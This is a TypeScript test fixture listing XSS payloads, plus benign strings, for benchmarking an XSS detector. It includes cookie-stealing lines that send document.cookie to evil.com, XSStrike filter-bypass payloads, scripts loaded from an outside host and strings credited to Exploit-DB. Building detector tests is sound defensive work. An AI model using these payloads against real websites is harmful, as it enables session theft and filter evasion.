import type { BenchmarkPayload } from "../benchmark.test"

export const xssPayloads: BenchmarkPayload[] = [
  // Script tag
  { input: "<script>alert('XSS')</script>", expect: true, source: "Basic script tag" },
  { input: "<script>document.cookie</script>", expect: true, source: "Script cookie theft" },
  { input: "<script>fetch('https://evil.com/'+document.cookie)</script>", expect: true, source: "Script exfiltration" },

  // Event handlers
  { input: "<img src=x onerror=alert(1)>", expect: true, source: "onerror image" },
  { input: "<img src=x onerror='fetch(\"https://evil.com/\"+document.cookie)'>", expect: true, source: "onerror exfil" },
  { input: "<body onload=alert(1)>", expect: true, source: "onload body" },
  { input: "<div onclick=alert(1)>click</div>", expect: true, source: "onclick div" },
  { input: "<span onmouseover=alert(1)>hover</span>", expect: true, source: "onmouseover span" },
  { input: "<form onsubmit=alert(1)><input type=submit></form>", expect: true, source: "onsubmit form" },
  { input: "<input onfocus=alert(1) autofocus>", expect: true, source: "onfocus input" },
  { input: "<input onblur=alert(1)>", expect: true, source: "onblur input" },
  { input: "<select onchange=alert(1)><option>a</option></select>", expect: true, source: "onchange select" },

  // javascript: URLs
  { input: "<a href='javascript:alert(1)'>click</a>", expect: true, source: "javascript: URL in link" },
  { input: "javascript:alert(document.cookie)", expect: true, source: "javascript: URL bare" },

  // Document cookie access
  { input: "document.cookie", expect: true, source: "document.cookie read" },
  { input: "eval(document.cookie)", expect: true, source: "eval + document.cookie" },

  // eval
  { input: "eval('alert(1)')", expect: true, source: "eval basic" },
  { input: "eval(atob('YWxlcnQoMSk='))", expect: true, source: "eval base64" },

  // iframe / object / embed
  { input: "<iframe src='http://evil.com'></iframe>", expect: true, source: "iframe to evil" },
  { input: "<iframe srcdoc='<script>alert(1)</script>'></iframe>", expect: true, source: "iframe srcdoc" },
  { input: "<object data='http://evil.com'></object>", expect: true, source: "object tag" },
  { input: "<embed src='http://evil.com'>", expect: true, source: "embed tag" },

  // SVG + script
  { input: "<svg><script>alert(1)</script></svg>", expect: true, source: "SVG with script" },
  { input: "<svg onload=alert(1)>", expect: true, source: "SVG onload" },

  // Multiple patterns
  { input: "<script>alert(1)</script><img src=x onerror=alert(2)>", expect: true, source: "Multiple XSS vectors" },

  // XSStrike WAF-bypass payloads (wire form — JS unicode escapes kept as
  // literal `\u00XX` text, like they arrive in a request)
  { input: "'\"</Script><Html Onmouseover=(confirm)()//", expect: true, source: "XSStrike: script-break + onmouseover" },
  { input: "<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>", expect: true, source: "XSStrike: comment wrap + onerror" },
  { input: "<deTails open oNToggle=confi\\u0072m()>", expect: true, source: "XSStrike: details ontoggle + js escape" },
  { input: "<img sRc=l oNerrOr=(confirm)() x>", expect: true, source: "XSStrike: case-mutated img onerror" },
  { input: "<svg/x=\"\">\"/onload=confirm()//", expect: true, source: "XSStrike: svg quote-break onload" },
  { input: "<svg%0Aonload=%09((pro\\u006dpt))()//", expect: true, source: "XSStrike: svg whitespace-encoded onload" },
  { input: "<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>", expect: true, source: "XSStrike: img onload + js-escaped eval" },
  { input: "<sCript x>confirm``</scRipt x>", expect: true, source: "XSStrike: script tag confirm" },
  { input: "<Script x>prompt()</scRiPt x>", expect: true, source: "XSStrike: script tag prompt" },
  { input: "<sCriPt sRc=//14.rs>", expect: true, source: "XSStrike: script src slash" },
  { input: "<embed//sRc=//14.rs>", expect: true, source: "XSStrike: embed slash form" },
  { input: "<base href=//14.rs/><script src=/>", expect: true, source: "XSStrike: base href + script src" },
  { input: "<object//data=//14.rs>", expect: true, source: "XSStrike: object slash form" },
  { input: "<s=\" onclick=confirm``>clickme", expect: true, source: "XSStrike: onclick in attr" },
  { input: "<svG oNLoad=co\\u006efirm&#x28;1&#x29>", expect: true, source: "XSStrike: svg onload + entity parens" },
  { input: "'\"><y///oNMousEDown=((confirm))()>Click", expect: true, source: "XSStrike: onmousedown quote-break" },
  { input: "<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>", expect: true, source: "XSStrike: entity-encoded javascript URL" },
  { input: "<img src=x onerror=confir\\u006d`1`>", expect: true, source: "XSStrike: img onerror + js escape" },
  { input: "<svg/onload=co\\u006efir\\u006d`1`>", expect: true, source: "XSStrike: svg onload + double js escape" },

  // Safe — should NOT trigger
  { input: "hello world", expect: false, source: "Safe text" },
  { input: "http://www.example.com/", expect: false, source: "Safe URL" },
  { input: "", expect: false, source: "Empty string" },
  { input: "John said hello", expect: false, source: "Normal text" },
  { input: "const x = 42; console.log(x)", expect: false, source: "Code snippet" },
  { input: "The meeting is at 10:30 online", expect: false, source: "Colon + online prose" },
  { input: "once = twice = two", expect: false, source: "once= prose (no generic on[a-z]+= regex)" },
  { input: "javascript is a language, not a URL", expect: false, source: "javascript prose" },
  { input: "line%0abreak text", expect: false, source: "Literal %0a in prose" },
  { input: "ontoggle is an HTML attribute name", expect: false, source: "ontoggle prose without =" },
  { input: "payload \\u0065xample escape", expect: false, source: "Literal js escape in prose" },
  { input: "&#40; parens entity in prose", expect: false, source: "Literal paren entity" },

  // Exploit-DB webapp PoCs (real XSS strings from the exploit archive, CVE-referenced)
  { input: "$('<img src=x onerror=alert(1)>').appendTo('body')", expect: true, source: "EDB jQuery selector XSS (CVE-2015-9251)" },
  { input: "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">", expect: true, source: "EDB mXSS chain (CVE-2019-11358 class)" },
  { input: "'\"</Script><Html Onmouseover=(confirm)()//", expect: true, source: "EDB script-break onmouseover (CVE-2014-3960 class)" },
  { input: "<svg/onload=alert('xss')>", expect: true, source: "EDB svg onload reflected" },
  { input: "javascript:alert(String.fromCharCode(88,83,83))", expect: true, source: "EDB encoded javascript URL (CVE-2013-6712 class)" },
]

